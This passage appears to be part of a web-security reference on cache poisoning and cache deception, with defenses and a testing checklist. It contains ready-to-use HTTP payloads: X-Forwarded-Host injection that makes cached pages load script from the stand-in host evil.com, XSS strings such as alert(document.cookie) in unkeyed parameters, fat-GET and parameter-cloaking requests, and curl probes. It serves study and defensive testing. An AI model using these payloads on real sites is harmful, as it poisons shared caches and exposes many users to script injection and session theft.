# cache-poisoning-test · part 2

> 分段 2/3。完整索引见 `cache-poisoning-test.md`。

## 5. CACHE POISONING REAL-WORLD PATTERN

### X-Forwarded-Host → Open Graph / Meta Tag Injection

```text
### Target page uses X-Forwarded-Host to generate meta tags:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

### Response:
<meta property="og:image" content="https://evil.com/assets/logo.png">
### or:
<link rel="canonical" href="https://evil.com/">

### If response is cached → all users see evil.com references
### Impact: XSS via injected JS path, phishing via canonical redirect, SEO hijack
```

### Cache Deception with Path Separator Tricks

```text
### Semicolon (treated as path parameter by some frameworks):
/account/profile;.css

### Encoded separators:
/account/profile%2F.css

### Trailing dot/space:
/account/profile/.css
/account/profile .css
```

---
## 6. DEFENSE

### For Cache Deception

- Cache only explicitly static paths (e.g., `/static/*`, `/assets/*`)
- Never cache based on file extension alone
- Set `Cache-Control: no-store, private` on authenticated endpoints
- Use `Vary: Cookie` to prevent cross-user cache hits

### For Cache Poisoning

- Include all reflected headers in cache key
- Validate and sanitize `X-Forwarded-*` headers
- Use `Cache-Control: no-cache` for dynamic content
- Strip unknown headers at CDN edge

---
## 6. TESTING CHECKLIST

```
□ Identify CDN/cache layer (X-Cache, Age, Via headers)
□ Append .css/.js/.png to authenticated API endpoints
□ Check if response is cached (X-Cache: HIT on second request)
□ Test path separators: /x.css, ;.css, %2F.css
□ Test unkeyed headers: X-Forwarded-Host, X-Original-URL
□ Verify Cache-Control headers on sensitive endpoints
□ Check Vary header presence
□ Test with and without authentication
```


---
## 附件：CACHE_POISONING_TECHNIQUES

### Web Cache Poisoning Techniques — Advanced Reference
## 1. WEB CACHE POISONING vs WEB CACHE DECEPTION

These are **distinct attack classes** — do not confuse them.

| Aspect | Cache Poisoning | Cache Deception |
|---|---|---|
| **Goal** | Serve **malicious content** to all users | Steal **victim's authenticated data** |
| **Who triggers** | Attacker sends poisoning request | Victim visits crafted URL |
| **What gets cached** | Attacker-controlled response (XSS, redirect) | Victim's authenticated response |
| **Who is harmed** | All users who hit the cache | The specific victim whose data is cached |
| **Attacker's role** | Active (sends request with unkeyed poison) | Passive (waits for victim, then reads cache) |
| **Key technique** | Unkeyed input manipulation | Path confusion / extension appending |
| **Detection signal** | Response contains unexpected injected content | Authenticated content accessible without auth |

### Attack Flow Comparison

```
CACHE POISONING:
  Attacker → sends request with X-Forwarded-Host: evil.com
  → Cache stores response with evil.com references
  → Normal users get poisoned response

CACHE DECEPTION:
  Attacker → tricks victim into visiting /profile/x.css
  → Server returns victim's profile data (ignores x.css)
  → Cache stores response (thinks it's static CSS)
  → Attacker fetches /profile/x.css → reads victim's data
```

---
## 2. UNKEYED HEADER POISONING

### 2.1 Cache Key Basics

The **cache key** is what the cache uses to determine if a stored response matches a request. Typically includes:
- HTTP method
- Host header
- URL path
- Query string (sometimes)

**NOT typically included** (= unkeyed):
- Most request headers
- Cookies (sometimes)
- Request body (for GET)

If an unkeyed input is **reflected** in the response, it can be poisoned.

### 2.2 X-Forwarded-Host Poisoning

The most common cache poisoning vector.

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

HTTP/1.1 200 OK
...
<script src="https://evil.com/static/app.js"></script>
```

If `X-Forwarded-Host` is not in the cache key but is reflected in the response → poison stores `evil.com` JavaScript for all users requesting `/`.

**Common reflection points**:
- `<script src="...">` and `<link href="...">`
- Open Graph meta tags: `<meta property="og:url" content="...">`
- Canonical links: `<link rel="canonical" href="...">`
- Resource prefetch: `<link rel="dns-prefetch" href="...">`
- Dynamic import maps

### 2.3 X-Forwarded-Scheme / X-Forwarded-Proto

Forces HTTPS → HTTP downgrade in cached response:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Scheme: http

HTTP/1.1 301 Moved
Location: http://target.com/    ← now HTTP, not HTTPS
```

Cache stores a redirect to HTTP → MITM opportunity for all cached users.

### 2.4 X-Original-URL / X-Rewrite-URL

Some frameworks (IIS/ASP.NET, Symfony) use these headers to override the request path:

```http
GET / HTTP/1.1
Host: target.com
X-Original-URL: /admin/users?id=1

Cache key = GET /
But server processes /admin/users?id=1
Response gets cached under /
```

> **Verify with a READ-ONLY admin path** as above — never point the override header at a delete/action endpoint.

### 2.5 Multiple Host Headers

```http
GET / HTTP/1.1
Host: target.com
Host: evil.com

### Some caches key on first Host, some apps use last Host
### If cache keys on target.com but app reflects evil.com → poisoned
```

### 2.6 X-Forwarded-Port

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Port: 1337

### If port is reflected in absolute URLs:
### <a href="https://target.com:1337/path">
### May cause resource loading failures → DoS via cache poisoning
```

### 2.7 Discovery Methodology

```bash
### Step 1: Identify cache (check response headers)
curl -v https://target.com/ 2>&1 | grep -i "x-cache\|age\|via\|cf-cache"

### Step 2: Find reflected unkeyed headers
### Send request with unique header values:
curl -H "X-Forwarded-Host: canary123.com" https://target.com/ | grep "canary123"
curl -H "X-Forwarded-Scheme: canary" https://target.com/ | grep "canary"
curl -H "X-Original-URL: /canary" https://target.com/ | grep "canary"

### Step 3: Verify it's unkeyed
### Send normal request → check if canary value is in cached response:
curl https://target.com/ | grep "canary123"
### If found → successfully poisoned

### Tool: Param Miner (Burp extension) automates unkeyed header discovery
```

---
## 3. UNKEYED PARAMETER POISONING

### 3.1 Concept

Some query parameters are excluded from the cache key (for tracking, analytics, etc.) but are reflected in the response.

### 3.2 Common Unkeyed Parameters

```
utm_content      utm_source       utm_medium       utm_campaign
utm_term         fbclid           gclid            _ga
dclid            msclkid          mc_eid           ref
callback         jsonp            _                cb
```

### 3.3 Example Attack

```http
GET /page?utm_content="><script>alert(1)</script> HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
...
<a href="/page?utm_content="><script>alert(1)</script>">Share</a>
```

Cache key: `GET /page` (utm_content excluded)
Response: contains XSS payload
Result: all users visiting `/page` get XSS.

### 3.4 Parameter Discovery

```bash
### Burp Param Miner: "Guess query parameters" scan

### Manual: append unique parameter and check if cache key changes
curl "https://target.com/page?cachebuster=abc123" -v
### → X-Cache: MISS (new cache entry? or same as /page?)

curl "https://target.com/page" -v
### → X-Cache: HIT and response matches previous? Then /page is the key (query excluded)
### → X-Cache: MISS? Then query IS in the key
```

### 3.5 Reflected Parameter in JavaScript

```http
GET /page?callback=alert HTTP/1.1

HTTP/1.1 200 OK
<script>
var config = {
  callback: "alert",  // reflected from query parameter
  ...
};
</script>
```

If `callback` is excluded from cache key but reflected in JavaScript:

```http
GET /page?callback=alert(document.cookie)// HTTP/1.1
```

Cached for all users requesting `/page`.

---
## 4. FAT GET CACHE POISONING

### 4.1 Concept

Some origins accept and process GET request **body** (despite RFC discouraging it). If the cache ignores the body (not in cache key) but the origin reflects body content, the response can be poisoned.

### 4.2 Example

```http
GET /api/config HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

callback=alert(1)

HTTP/1.1 200 OK
Content-Type: application/javascript
Cache-Control: public, max-age=3600

alert(1)({"theme":"default","lang":"en"})
```

Cache key: `GET /api/config` (body not included)
Response: contains attacker's callback value
Result: all users get `alert(1)` when loading `/api/config`.

### 4.3 Detection

```bash
### Step 1: Check if origin processes GET body
curl -X GET https://target.com/api/endpoint \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=canary_value"
### Check if canary_value appears in response

### Step 2: Check if response is cached
curl https://target.com/api/endpoint
### Check X-Cache header and whether canary_value persists

### If canary in cached response → Fat GET poisoning confirmed
```

### 4.4 Frameworks That Process GET Body

| Framework | GET Body Processing |
|---|---|
| Ruby on Rails | Yes (parsed by default) |
| Express.js | Depends on middleware (body-parser) |
| Django | Yes (request.POST populated for GET with body) |
| Flask | Yes (request.form available) |
| ASP.NET | Depends on model binding configuration |
| Spring | Depends on `@RequestBody` annotation |

---
## 5. PARAMETER CLOAKING

### 5.1 Semicolon as Parameter Separator

Some platforms treat `;` as a parameter separator, others don't:

```http
GET /page?legit=value;poison=xss HTTP/1.1

### Ruby on Rails: parses as two params: legit=value, poison=xss
### PHP: parses as one param: legit=value;poison=xss
### Cache (Varnish): may key on "legit=value;poison=xss" as opaque string
```

**Exploit**: if cache keys on full query string but back-end parses `;` as separator:

```http
GET /page?legit=value;callback=alert(1) HTTP/1.1

### Cache key: /page?legit=value;callback=alert(1)
### Origin parses: legit=value AND callback=alert(1)
### Response reflects: alert(1) in callback
### Next request to /page?legit=value;callback=alert(1) gets poisoned response
```

### 5.2 Different Delimiter Parsing

| Platform | `;` Behavior | `&` Behavior |
|---|---|---|
| PHP | Literal (part of value) | Parameter separator |
| Ruby on Rails | Parameter separator | Parameter separator |
| Java (Servlet) | Parameter separator (`;` in path = path parameter) | Parameter separator |
| ASP.NET | Depends on configuration | Parameter separator |
| Node.js (querystring) | Literal | Parameter separator |
| Python (urllib) | Can be configured as separator | Parameter separator |

### 5.3 Duplicate Parameters

```http
GET /page?param=safe&param=<script>alert(1)</script> HTTP/1.1

### Cache may key on first occurrence: param=safe
### Origin may use last occurrence: param=<script>alert(1)</script>
```

| Platform | Duplicate Parameter Behavior |
|---|---|
| PHP | Last value wins |
| ASP.NET | Comma-joined (both values) |
| Ruby on Rails | Last value wins |
| Python Flask | First value wins |
| Java Servlet | First value wins (`getParameter`), all values (`getParameterValues`) |
| Node.js Express | Array of all values |

### 5.4 URL Path Parameter Cloaking

```http
### Semicolons in URL path (Java servlet path parameters):
GET /page;jsessionid=abc;param=value HTTP/1.1

### Tomcat/Jetty: strips ;param=value from path
### Cache: may include full path in key or strip differently
```

---
